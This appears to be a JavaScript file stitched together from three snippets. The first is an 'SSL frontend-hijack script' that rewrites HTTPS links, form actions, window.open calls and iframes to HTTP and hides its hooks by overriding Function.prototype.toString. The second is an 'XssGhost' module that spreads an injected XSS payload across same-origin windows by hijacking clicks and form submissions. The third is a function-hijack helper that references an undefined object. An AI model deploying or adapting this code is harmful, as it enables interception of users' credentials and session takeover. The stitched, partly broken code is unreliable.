/**
 * SSL frontend-hijack script
 *   @version 0.1.1
 *   @update 2014/10/28
 */
(function() {
    // for ie6,7,8
    var DOM_3 = !!window.addEventListener;
    function $bind(target, event, callback) {
        if (DOM_3) {
            target.addEventListener(event, callback);
        }
        else {
            target.attachEvent('on' + event, callback);
        }
    }
    function $operator(fn, thiz, $) {
        // standard
        if ('apply' in fn) {
            return fn.apply(thiz, $);
        }
        // functor (old-ie)
        switch ($.length) {
            case 0 : return fn();
            case 1 : return fn($[0]);
            case 2 : return fn($[0], $[1]);
            case 3 : return fn($[0], $[1], $[2]);
            default: return fn($[0], $[1], $[2], $[3]);
        }
    }
    //
    // url transform
    //
    var R_HTTPS = /^https:/i;
    var R_FAKE = /[?&]zh_cn#?/;
    var FAKE_SYMBOL = 'zh_cn';
    function isFakeUrl(url) {
        return R_FAKE.test(url);
    }
    function isHttpsUrl(url) {
        return url && R_HTTPS.test(url);
    }
    function downgradeUrl(url) {
        // change protocol, and make a mark
        return url.replace(R_HTTPS, 'http:') +
            (/\?/.test(url) ? '&' : '?') + FAKE_SYMBOL;
    }
    //
    // Hook System
    //
    var _hasOwnProperty = Object.prototype.hasOwnProperty;  // for old-IE
    function hook(ns, key, factory) {
        if (!_hasOwnProperty.call(ns, key)) {
            return false;
        }
        var oldFn = ns[key];
        var newFn = factory(oldFn);
        newFn._str_ = oldFn + '';
        ns[key] = newFn;
        return true;
    }
    // hidden source code
    function toString_factory(oldFn) {
        return function() {
            return this._str_ || oldFn.apply(this, arguments);
        };
    }
    hook(Function.prototype, 'toString', toString_factory);
    hook(Function.prototype, 'toSource', toString_factory);
    //
    // hook window.open('https://...')
    //
    function winopen_factory(oldFn) {
        return function(url) {
            if (isHttpsUrl(url)) {
                arguments[0] = downgradeUrl(url);
            }
            return $operator(oldFn, this, arguments);
        };
    }
    if (window.Window) {
        hook(Window.prototype, 'open', winopen_factory);
    }
    hook(window, 'open', winopen_factory);
    //
    // Event Hook
    //
    function cheat(el, urlProp) {
        var url = el[urlProp];
        el[urlProp] = downgradeUrl(url);
        // restore later
        setTimeout(function() {
            el[urlProp] = url;
        }, 100);
    }
    // hook <a href="https://...">
    $bind(document, 'click', function(e) {
        e = e || event;
        var el = e.target || e.srcElement;
        do {
            if (el.tagName == 'A') {
                if (el.protocol == 'https:') {
                    cheat(el, 'href');
                }
            }
        } while(el = el.parentNode);
    });
    // hook <form action="https://...">
    if (DOM_3) {
        $bind(document, 'submit', submitHandler);
    }
    else {
        setInterval(function() {
            var forms = document.getElementsByTagName('form');
            for(var i = forms.length - 1; i >= 0; i--) {
                var form = forms[i];
                if (!form._hooked_) {
                    form._hooked_ = true;
                    $bind(form, 'submit', submitHandler);
                }
            }
        }, 500);
    }
    function submitHandler(e) {
        e = e || event;
        var el = e.target || e.srcElement;
        if (isHttpsUrl(el.action)) {
            cheat(el, 'action');
        }
    }
    //
    // monitor <iframe src="https://...">
    //
    function scanFrames(el) {
        var frames = document.getElementsByTagName('iframe');
        for (var i = 0, n = frames.length; i < n; i++) {
            var el = frames[i];
            if (isHttpsUrl(el.src)) {
                el.src = downgradeUrl(el.src);
            }
        }
    }
    var timer = setInterval(scanFrames, 20);
    $bind(window, 'load', function() {
        clearInterval(timer);
        setInterval(scanFrames, 200);
    });
})();




var XssGhost = function() {

    function module(id, payload, winList, first) {
        var window = this;

        // debug
        window.addEventListener('error', function(e) {
            alert('err: ' + e.message);
        });

        // 使用副本
        winList = winList.concat();


        function globalCall(win, code, args) {
            code = '(' + code + ').apply(this,arguments)';
            if (!win.Function) {
                return false;
            }
            var fn = win.Function(code);
            fn.apply(null, args || []);
            return true;
        }

        //
        // 弹窗钩子
        //
        var mFnWinOpen = window.open;
        window.open = function(url) {
            var win = mFnWinOpen.apply(this, arguments);
            if (win) {
                if (!url || /about:blank/i.test(url)) {
                    win.__xss_blank = true;
                }
                welcome(win);
            }
            return win;
        };

        // 获取当前超链接元素
        function getLinkElem(e) {
            var el = e.target;
            do {
                var tag = el.tagName;
                if (tag == 'A' || tag == 'AREA') {
                    return el;
                }
                el = el.parentNode;
            } while (el != document);
        }

        // 超链接劫持
        function clickHandler(e) {
            if (e.defaultPrevented) {
                return;
            }
            var link = getLinkElem(e);
            if (!link) {
                return;
            }
            if (!/http|about/.test(link.protocol)) {
                return;
            }
            // 屏蔽默认行为，模拟弹窗
            e.preventDefault();
            open(link.href);
        }

        // 表单劫持
        function submitHandler(e) {
            if (e.defaultPrevented) {
                return;
            }
            // 在新页面中提交
            var name = Math.random();
            var win = open('', name);

            var form = e.target;
            form.target = name;
        }

        // 通知大家，有新页面加入
        function broadcast(win) {
            enumWinList(function(v) {
                var notify;
                try {
                    notify = v.__xss_notify;
                } catch(e) {}

                if (notify) {
                    notify(win);
                }
            });
        }

        // broadcast 通知接口
        window.__xss_notify = function(win) {
            var exist;
            enumWinList(function(v) {
                if (v == win) {
                    exist = true;
                    return false;
                }
            });
            if (!exist) {
                winList.push(win);
            }
        };

        // 更新所有 Window
        function update() {
            var newList = [];

            // 刷新列表，过滤关闭的窗体
            enumWinList(function(v) {
                if (v != window) {
                    check(v);
                }
                newList.push(v);
            });
            winList = newList;
        }


        function enumWinList(callback) {
            var n;
            try {
                // IE 下各种异常
                n = winList.length;
            } catch(e) {
                return;
            }

            for (var i = 0; i < n; i++) {
                var win;
                try {
                    win = winList[i];
                    if (win.closed) {
                        continue;
                    }
                } catch (e) {
                    continue;
                }
                if (callback(win) === false) {
                    break;
                }
            }
        }

        // 新页面加入
        function welcome(win) {
            //
            // 不同源的 Window 也可以先关注起来，
            // 以后转到同源的页面里，仍可控制
            //
            broadcast(win);
            check(win);
        }

        function isLoadingPage(win) {
            return win.location.href == 'about:blank' && !win.__xss_blank;
        }

        function isSameOrigin(win) {
            try {
                return !!win.Function;
            } catch(e) {
                return false;
            }
        }

        // 检测指定的窗口
        function check(win) {
            if (!isSameOrigin(win)) {
                return;
            }
            if (id in win) {
                return; // 已初始化
            }

            // 注入当前模块到新 Window
            if (!win.__xss_injected) {
                var args = [
                    id,
                    payload,
                    winList
                ];
                if (!globalCall(win, module, args)) {
                    return;
                }
                win.__xss_injected = true;
            }

            // 过渡页
            if (isLoadingPage(win)) {
                return;
            }

            // 过渡完成，正式初始化
            var fnInit = win.__xss_init;
            if (fnInit) {
                fnInit();

                // 标记已注入
                win[id] = true;
            }
        }

        // 正式初始化
        window.__xss_init = function() {
            // 执行 XSS 代码
            globalCall(window, payload);

            // 定时检测页面
            setInterval(update, 1000);

            document.addEventListener('click', clickHandler);
            document.addEventListener('submit', submitHandler);
        };


        // 关注退出消息
        window.addEventListener('message', function(e) {
            if (e.data == 'SOS') {
                e.stopImmediatePropagation();
                //console.warn('SOS');
                update();
            }
        }, true);

        // 页面退出事件（刷新或关闭）
        window.addEventListener('unload', function() {
            // 通知其他页面
            enumWinList(function(v) {
                if (v != window) {
                    try {
                        v.postMessage('SOS', '*');
                    } catch(e) {}
                }
            });
        });


        function injectParent() {
            var win = window;
            while (win = win.parent) {
                welcome(win);
            }
        }

        //
        // 注入来源页
        //   opener 可能不同源，
        //   但若 opner.opener 同源，仍然可以控制
        //
        function injectOpener() {
            var win = self;
            for (;;) {
                try {
                    win = win.top.opener;
                } catch (e) {
                    break;
                }
                if (!win) {
                    break;
                }
                welcome(win);
            }
        }

        // 注入相关页面
        if (first) {
            __xss_init();

            // 这个版本未考虑子页面
            // TODO: 遍历 window.frames
            if (self == top) {
                injectOpener();
            }
        }
    }


    function init(opt) {
        // 不考虑老 IE 浏览器了
        if (!window.addEventListener) {
            return;
        }

        var id = '__xss_id_' + opt.id;
        if (id in window) {
            return;
        }
        window[id] = true;

        var payload = opt.payload;
        payload();

        module(id, payload + '', [window], true);
    }

    return {
        init: init
    };
}();

//函数劫持
var Hijack = (function(){
    return {
        before: before
    };
    function before(fnString, beforeFn){
        // These should be some error checking

        originalFn = getFunctionByName(fnString, window)
        Manipulate.redefineFunction(fnString, function(){
            beforeFn.apply(this, arguments);
            originalFn.apply(this, arguments);
            // executeFunctionByName(fnString, window);
        }, window)
    }

    function getFunctionByName(functionName, context /*, args */) {
        var namespaces = functionName.split(".");
        var func = namespaces.pop();

        for(var i = 0; i < namespaces.length; i++) {
            context = context[namespaces[i]];
        }

        return context[func];
    }
})();

var redefineFunction = require("redefine-function");

var HijackFunction = {
    before: hijackBefore
};

function hijackBefore(context, fnString, beforeFn){
    // There should be some error checking
    originalFn = getFunctionByName(fnString, context)
    redefineFunction(context, fnString, function(){
        beforeFn.apply(this, arguments);
        originalFn.apply(this, arguments);
        // executeFunctionByName(fnString, window);
    })
}

function getFunctionByName(functionName, context) {
    var namespaces = functionName.split(".");
    var func = namespaces.pop();

    for(var i = 0; i < namespaces.length; i++) {
        context = context[namespaces[i]];
    }

    return context[func];
}

module.exports = HijackFunction;


